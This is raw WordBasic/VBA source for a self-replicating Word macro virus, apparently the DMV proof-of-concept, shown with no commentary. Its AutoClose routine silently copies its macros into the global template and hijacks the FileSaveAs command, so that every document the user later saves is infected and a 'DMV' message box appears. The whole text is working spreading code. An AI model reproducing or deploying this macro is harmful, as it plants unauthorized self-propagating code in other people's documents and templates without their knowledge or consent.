   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Dim iMacroCount
   Dim i
   Dim binstalled
   Dim bTooMuchTrouble
   Dim sMe$
   Dim sMacro$
   'just to prove another point
   On Error GoTo -1: On Error GoTo Abort
   iMacroCount = WordBasic.CountMacros(0, 0)
   'see we're already installed
   For i = 1 To iMacroCount
       If WordBasic.[MacroName$](i, 0, 0) = "DMV" Then
           binstalled = -1
       End If
       If WordBasic.[MacroName$](i, 0, 0) = "FileSaveAs" Then
           bTooMuchTrouble = -1
       End If
   Next i
   If Not binstalled And Not bTooMuchTrouble Then
       'add FileSaveAs and copies of FileSaveAs and AutoClose
       'DMV is just for more fun
       sMe$ = WordBasic.[FileName$]()
       sMacro$ = sMe$ + ":DMV"
       WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
       sMacro$ = sMe$ + ":AutoClose"
       WordBasic.MacroCopy sMacro$, "Global:DMV"
       WordBasic.MsgBox "               DMV               ", 1
   End If
   Abort:
   End Sub

   Attribute VB_Name = "DMV"

   Public Sub MAIN()
   Dim sMe$
   Dim sTMacro$
   'just to prove another point
   'this becomes the FileSaveAs for the original template
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo Bail
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   sMe$ = WordBasic.[FileName$]()
   sTMacro$ = sMe$ + ":AutoClose"
   WordBasic.MacroCopy "Global:DMV", sTMacro$
   sTMacro$ = sMe$ + ":DMV"
   WordBasic.MacroCopy "Global:FileSaveAs", sTMacro$
   WordBasic.FileSaveAs dlg
   GoTo Done

   Bail:
   If Err.Number <> 102 Then
       WordBasic.FileSaveAs dlg
   End If
   Done:
   End Sub
